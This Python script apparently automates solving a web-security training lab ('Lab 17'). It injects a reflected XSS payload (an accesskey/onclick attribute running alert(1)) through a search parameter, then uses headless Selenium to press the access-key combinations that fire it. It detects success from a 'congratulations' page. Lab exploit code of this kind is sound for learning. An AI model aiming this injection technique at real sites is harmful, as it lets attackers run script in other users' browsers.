import argparse
import requests
import urllib3
from urllib.parse import urljoin
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

driver = None
wait = None

def setup_driver():
    global driver, wait
    if driver is None:
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--ignore-certificate-errors')
        
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        wait = WebDriverWait(driver, 10)
    return driver, wait

def cleanup_driver():
    global driver
    if driver:
        driver.quit()
        driver = None

def xss_test(url, use_proxy=False):
    try:
        proxies = {
            'http': '127.0.0.1:8080',        
            'https': '127.0.0.1:8080'
        } if use_proxy else None
        
        setup_driver()
        
        payload = "?search='accesskey='x'onclick='alert(1)"
        search_url = urljoin(url, payload)
        
        print(f"Sending XSS payload: {payload}")
        requests.get(search_url, proxies=proxies, verify=False, timeout=30)
        
        trigger_xss(url)
        
        return is_solved(url, proxies)
            
    except Exception as e:
        print(f"Error during XSS test: {e}")
        return False, None
    finally:
        cleanup_driver()

def trigger_xss(url):
    global driver, wait
    try:
        driver.get(url)
        time.sleep(2)
        
        body = driver.find_element(By.TAG_NAME, "body")
        
        key_combinations = [
            (Keys.ALT, "x"),
            (Keys.CONTROL + Keys.ALT, "x"),
            (Keys.ALT + Keys.SHIFT, "x")
        ]
        
        for combo, key in key_combinations:
            try:
                body.send_keys(combo + key)
                time.sleep(1)
            except Exception as e:
                print(f"Error with key combination: {e}")
                
    except Exception as e:
        print(f"Error in trigger_xss: {e}")
        return False

def is_solved(url, proxies):
    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        if response.status_code != 200:
            return False, response
        return "congratulations" in response.text.lower(), response
    except:
        return False, None

def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 17')
    parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'
    
    print("Starting XSS Test...")
    print(f"Target URL: {args.url}")
    
    success, response = xss_test(args.url, args.proxy)
    if success:
        print("XSS Lab completed successfully!")
    else:
        print("XSS Lab failed.")
        if response:
            print(f"HTTP Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")

if __name__ == "__main__":
    main()
